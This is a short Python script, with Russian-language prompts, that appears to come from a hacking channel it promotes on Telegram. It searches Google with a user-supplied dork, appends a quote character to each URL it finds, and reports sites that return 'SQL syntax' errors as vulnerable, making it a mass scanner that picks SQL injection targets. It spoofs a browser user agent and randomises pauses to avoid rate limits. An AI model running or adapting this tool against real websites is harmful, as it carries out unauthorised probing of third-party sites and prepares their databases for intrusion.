from os import system, name
from googlesearch import search
from socket import timeout
from loguru import logger

import urllib
import urllib.request
import random


class Banners:
    def cl():
        system('cls' if name == 'nt' else 'clear')
    def me():
        system('termux-open-url https://t.me/milf_hacks')
    def banner():
        return '''
(           (     (     
)\ )   (    )\ )  )\ )  
(()/( ( )\  (()/( (()/(  
/(_)))((_)  /(_)) /(_)) 
(_)) ((_)_  (_))  (_))   
/ __| / _ \ | |   | |    
\__ \| (_) || |__ | |__  
|___/ \__\_\|____||____| 
                        
'''


def main():
    Banners.cl()
    Banners.me()
    dork = "inurl:" + input("Введите гугл dork (пример - php?id=, aspx?id=): ")
    total_output = int(input("Введите количество сайтов: "))
    page_no = int(input("С какой страницы гугла начинать парсить (пример - 1,2,3): "))
    Banners.cl()
    try:
        query = dork + " "
        pause_random = int(random.randrange(4, 10, 2))
        website_list = [ j for j in search(query,
            num=10,
            start=page_no*5, 
            stop=total_output, 
            pause=pause_random, 
            user_agent='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36')
            ]

        for i in website_list:
                try:
                    fullurl = i
                    try:
                        resp = urllib.request.urlopen(fullurl + "'", timeout=15) #set timeout 
                    except timeout:
                         logger.warning(i + " ===> " + "Время ожидания истекло!")

                    body = resp.read()
                    fullbody = body.decode('utf-8')

                    if "SQL syntax" in fullbody:  
                        logger.success(i + " ===> " +  " Уязвим!") 
                    else:
                        logger.warning(i + " ===> " +" Не уязвим")
                except:
                    logger.info(i + "  ===> " + " Не удалось проверить",)
                    continue
    except:
        logger.error("Твой ip забанен на 1 час из-за частых запросов, приходи позже")


if __name__ == '__main__':
    main()